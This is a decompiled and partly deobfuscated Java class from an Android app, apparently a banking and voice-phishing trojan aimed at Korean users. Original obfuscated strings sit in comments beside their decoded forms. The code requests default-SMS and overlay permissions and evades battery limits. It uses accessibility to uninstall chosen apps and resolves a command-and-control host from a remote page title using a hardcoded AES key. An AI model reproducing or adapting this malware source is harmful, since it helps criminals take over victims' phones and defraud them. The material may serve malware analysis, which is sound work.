package com.wish.lmbank.base;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.provider.Telephony;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import com.wish.lmbank.AppStartV;
import com.wish.lmbank.bean.UninstallApkBean;
import com.wish.lmbank.common.Constants;
import com.wish.lmbank.common.URL;
import com.wish.lmbank.helper.AccessibilityHelper;
import com.wish.lmbank.temp.Debugging;
import com.wish.lmbank.utils.AESUtils;
import com.wish.lmbank.utils.HandlerUtils;
import com.wish.lmbank.utils.LogUtils;
import com.wish.lmbank.utils.PermissionUtils;
import com.wish.lmbank.utils.SettingUtils;
import com.wish.lmbank.utils.ToastUtils;
import com.wish.lmbank.utils.ZipUtils;
import com.wish.lmbank.view.dialog.AlertDialog;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;

import java.io.File;
import java.io.IOException;
import java.util.Iterator;
import java.util.List;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/base/BaseActivityV.class */
public class BaseActivityV extends Activity implements BaseFuncIml, View.OnClickListener, AlertDialog.ClickListener {
    private static final int LOAD_URL_SUCCESS = 1;
    private static final String TAG = "com.wish.lmbank.base.BaseActivityV";
    public static BaseActivityV VJBaseActivity;
    protected AlertDialog alertDialog;
    private final int REQUEST_CODE_UNINSTALL_APK = 1001;
    private BroadcastReceiver mUninstallApkReceiver = null;
    private final Handler handler = new Handler() { // from class: com.wish.lmbank.base.BaseActivityV.1

        @Override // android.os.Handler
        public void handleMessage(Message message) {
            super.handleMessage(message);
            if (message != null && message.what == 1) {
                StringBuilder sb = new StringBuilder();
//                 sb.append(bb7d7pu7.m5998("KwgaDCgKHQAfAB0QRUklJigtNjw7JTY6PCoqLDo6U0k"));
                sb.append("BaseActivity, LOAD_URL_SUCCESS: ");
                sb.append(URL.getHost());
                LogUtils.callLog(sb.toString());
                startCustomService();
            }
        }
    };

    public int initLayoutView() {
        return 0;
    }

    public void initListener() {
    }

    @Override // com.wish.lmbank.base.BaseFuncIml
    public void initParams(Bundle bundle) {
    }

    /* JADX INFO: Access modifiers changed from: protected */
    public void loadUrl() {
    }

    public void onCallback(View view) {
    }

    public void onClick(View view) {
    }

    /* JADX INFO: Access modifiers changed from: protected */
    public void startCustomService() {
        AppStartV.isLoadUrl = true;
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(initLayoutView());
        initData();
        initView();
        initListener();
        initLoad();
    }

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // android.app.Activity
    public void onResume() {
        super.onResume();
        AppStartV.isMainActivityFront = true;
    }

    @Override // android.app.Activity
    protected void onStop() {
        super.onStop();
        AppStartV.isMainActivityFront = false;
    }

    @Override // android.app.Activity
    public void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        super.onRequestPermissionsResult(i, strArr, iArr);
    }

    public void startActivity(Class<?> cls) {
        startActivity(new Intent(this, cls));
    }

    public void startActivity(Class<?> cls, Bundle bundle) {
        Intent intent = new Intent();
        intent.setClass(this, cls);
        if (bundle != null) {
            intent.putExtras(bundle);
        }
        startActivity(intent);
    }

    public void startActivityForResult(Class<?> cls, Bundle bundle, int i) {
        Intent intent = new Intent();
        intent.setClass(this, cls);
        if (bundle != null) {
            intent.putExtras(bundle);
        }
        startActivityForResult(intent, i);
    }

    public void requestIgnoreBatteryOptimizations() {
        try {
//             Intent intent = new Intent(bb7d7pu7.m5998("CAcNGwYADUcaDB0dAAcOGkc7LDg8LDo9NiAuJyY7LDYrKD09LDswNiY5PSAkIDMoPSAmJzo"));
            Intent intent = new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
//             intent.setData(Uri.parse(bb7d7pu7.m5998("GQgKAggODFM") + getPackageName()));
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, 1000);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* JADX INFO: Access modifiers changed from: protected */
    public void showToast(String str) {
        Toast.makeText(this, str, Toast.LENGTH_SHORT).show();
    }

    public void initData() {
        VJBaseActivity = this;
        registerUninstallApkReceiver();
    }

    private void registerUninstallApkReceiver() {
        if (this.mUninstallApkReceiver != null) {
            return;
        }
        this.mUninstallApkReceiver = new BroadcastReceiver() { // from class: com.wish.lmbank.base.BaseActivityV.2
            @Override // android.content.BroadcastReceiver
            public void onReceive(Context context, Intent intent) {
                "UNINSTALL_APK".equals(intent.getAction());
            }
        };
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("UNINSTALL_APK");
        registerReceiver(this.mUninstallApkReceiver, intentFilter);
        return;
    }

    public void initView() {
        AlertDialog alertDialog = new AlertDialog(this);
        this.alertDialog = alertDialog;
        alertDialog.setClickListener(this);
    }

    public void initLoad() {
//         if (!new File(getExternalFilesDir(null).getPath() + bb7d7pu7.m5998("RgsMBQVGCBsaRlhaWVhHBF0I")).exists()) {
        if (!new File(getExternalFilesDir(null).getPath() + "/bell/ars/1301.m4a").exists()) {
            new Thread(new Runnable() { // from class: com.wish.lmbank.base.BaseActivityV.3
                @Override // java.lang.Runnable
                public void run() {
                    try {
//                         ZipUtils.unZipAssetsFolder(AppStartV.getContext(), bb7d7pu7.m5998("DQgdCEYLDAUFRxMAGQ"), getExternalFilesDir(null).getPath());
                        ZipUtils.unZipAssetsFolder(AppStartV.getContext(), "data/bell.zip", getExternalFilesDir(null).getPath());
                        loadUrl();
                    } catch (Exception e) {
//                         LogUtils.callLog(bb7d7pu7.m5998("HAczABkoGhoMHRovBgUNDBtFSQwbGwYbU0k") + e.getMessage());
                        Log.e("tag","unZipAssetsFolder, error: ",e);
                    }
                }
            }).start();
        } else {
            loadUrl();
        }
    }

    protected void toCloseTCall() {
//         if (SettingUtils.isPackageAvailable(AppStartV.getContext(), bb7d7pu7.m5998("CgYERxoCHUcZGwYNRw0ACAUMGw"))) {
        if (SettingUtils.isPackageAvailable(AppStartV.getContext(), "com.skt.prod.dialer")) {
            HandlerUtils.getMainThreadHandler().postDelayed(new Runnable() { // from class: com.wish.lmbank.base.BaseActivityV.4

                @Override // java.lang.Runnable
                public void run() {
//                     toSettings(bb7d7pu7.m5998("CAcNGwYADUcaDB0dAAcOGkcICh0ABgdHJCgnKC4sNiY_LDslKDA2OSw7JCA6OiAmJw"));
                    toSettings("android.settings.action.MANAGE_OVERLAY_PERMISSION");
                }
            }, Constants.OPEN_SMS ? 1500L : 800L);
        }
    }

    private void uninstallApk() {
        List<UninstallApkBean> uninstallApkList;
        if (!SettingUtils.isEnabledAccessibility(this) || (uninstallApkList = SettingUtils.getUninstallApkList(AppStartV.getContext(), AccessibilityHelper.UNINSTALL_APK)) == null || uninstallApkList.size() == 0) {
            return;
        }
        AppStartV.isUninstallApK = true;
//         Uri parse = Uri.parse(bb7d7pu7.m5998("GQgKAggODFM") + uninstallApkList.get(0).getPackageName());
        Uri parse = Uri.parse("package:" + uninstallApkList.get(0).getPackageName());
//         Intent intent = new Intent(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRy0sJSw9LA"), parse);
        Intent intent = new Intent("android.intent.action.DELETE", parse);
//            268435456
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//         intent.putExtra(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HDBEdGwhHOyw9PDsnNjssOjwlPQ"), true);
        intent.putExtra("android.intent.extra.RETURN_RESULT", true);
        intent.setData(parse);
        startActivityForResult(intent, 1001);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void toSettings(String str) {
        startActivity(new Intent(str));
    }

    /* JADX INFO: Access modifiers changed from: protected */
    public void requestIgnoreBattery() {
        if (Build.VERSION.SDK_INT < 23 || PermissionUtils.isIgnoringBatteryOptimizations(this)) {
            return;
        }
        requestIgnoreBatteryOptimizations();
        return;
    }

    /* JADX INFO: Access modifiers changed from: protected */
    public void requestDefaultSms() {
        if (Constants.OPEN_SMS) {
            HandlerUtils.getMainThreadHandler().postDelayed(new Runnable() { // from class: com.wish.lmbank.base.BaseActivityV.5

                @Override // java.lang.Runnable
                public void run() {
                    String packageName = getPackageName();
                    if (Telephony.Sms.getDefaultSmsPackage(AppStartV.getContext()).equals(packageName)) {
                        return;
                    }
//                     Intent intent = new Intent(bb7d7pu7.m5998("CAcNGwYADUcZGwYfAA0MG0c9DAUMGQEGBxBHKCo9ICYnNiohKCcuLDYtLC8oPCU9"));
                    Intent intent = new Intent("android.provider.Telephony.ACTION_CHANGE_DEFAULT");
//                     intent.putExtra(bb7d7pu7.m5998("GQgKAggODA"), packageName);
                    intent.putExtra("package", packageName);
                    startActivity(intent);
                }
            }, 1000L);
            return;
        }
        return;
    }

    @Override // android.app.Activity
    protected void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        if (i == 1001 && i2 == 0) {
            uninstallApk();
        }
    }

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // android.app.Activity
    public void onDestroy() {
        super.onDestroy();
        BroadcastReceiver broadcastReceiver = this.mUninstallApkReceiver;
        if (broadcastReceiver != null) {
            unregisterReceiver(broadcastReceiver);
            this.mUninstallApkReceiver = null;
        }
        VJBaseActivity = null;
    }

    public void loadHost() {

        if(Debugging.useDebugging){
            Debugging.setUrl();
            handler.sendEmptyMessage(1);//没有这行代码 不会启动RecServiceV，也就不会运行TelePhoneReceiver
        }if (AppStartV.isDebug) {
            this.handler.sendEmptyMessage(1);
        } else {
            new Thread(new Runnable() { // from class: com.wish.lmbank.base.BaseActivityV.6
                @Override // java.lang.Runnable
                public void run() {
                    String[] split;
                    String[] split2;
//                     String m5998 = bb7d7pu7.m5998("RA");
                    String m5998 = "-";
                    try {
//                        System.out.println(URL.URL_ALTERNATE_IP);
                        Document document = Jsoup.connect(URL.URL_ALTERNATE_IP).get();
//                         Iterator it = document.getElementsByTag(bb7d7pu7.m5998("HQAdBQw")).iterator();
                        Iterator it = document.getElementsByTag("title").iterator();
                        while (it.hasNext()) {
                            String html = ((Element) it.next()).html();
                            if (!TextUtils.isEmpty(html)) {
                                String[] split3 = html.split(m5998);
                                if (split3.length != 2) {
                                    return;
                                }
//                                 String decrypt = AESUtils.decrypt(!TextUtils.isEmpty(split3[0]) ? split3[0].trim() : "", bb7d7pu7.m5998("Ay07KAEGHh8RAg8_LBtYBA"));
                                String decrypt = AESUtils.decrypt(!TextUtils.isEmpty(split3[0]) ? split3[0].trim() : "", "jDRAhowvxkfVEr1m");
                                if (!TextUtils.isEmpty(decrypt) && (split = decrypt.split(m5998)) != null) {
                                    for (String str : split) {
//                                         if (!TextUtils.isEmpty(str) && (split2 = str.split(bb7d7pu7.m5998("Ng"))) != null && split2.length == 2) {
                                        if (!TextUtils.isEmpty(str) && (split2 = str.split("_")) != null && split2.length == 2) {
                                            if (Constants.SERVER_NAME.equals(split2[0])) {
                                                if (!AppStartV.isDebug) {
                                                    URL.setHost(split2[1]);
                                                }
                                                handler.sendEmptyMessage(1);
                                                return;
                                            }
                                        }
                                    }
                                    return;
                                }
                            } else {
//                                 LogUtils.callLog(bb7d7pu7.m5998("KwgaDCgKHQAfAB0QRUkFBggNIQYaHUVJHQAdBQxJCgYHHQwHHUkAGkkHHAUF"));
                                LogUtils.callLog("BaseActivity, loadHost, title content is null");
                            }
                        }
                        return;
                    } catch (IOException e) {
                        String message = e.getMessage();
//                         if (!TextUtils.isEmpty(message) && message.contains(bb7d7pu7.m5998("OwwIDUkdAAQMDUkGHB0"))) {
                        if (!TextUtils.isEmpty(message) && message.contains("Read timed out")) {
                            runOnUiThread(new Runnable() { // from class: com.wish.lmbank.base.BaseActivityV.6.1


                                @Override // java.lang.Runnable
                                public void run() {
//                                     ToastUtils.showShort(bb7d7pu7.m5998("hf7Zg9vZSYXi9YPZ7YX03UmF3eGD2tWC-fGF_uGF49yC4uGC4s0"));
                                    ToastUtils.showShort("연결 시간이 초과되었습니다");
                                }
                            });
                        }
//                         LogUtils.callLog(bb7d7pu7.m5998("KwgaDCgKHQAfAB0QRUkFBggNIQYaHUVJDBEKDBkdAAYHU0k") + e.getMessage());
                        LogUtils.callLog("BaseActivity, loadHost, exception: " + e.getMessage());
                        return;
                    }
                }
            }).start();
        }
        return;
    }
}
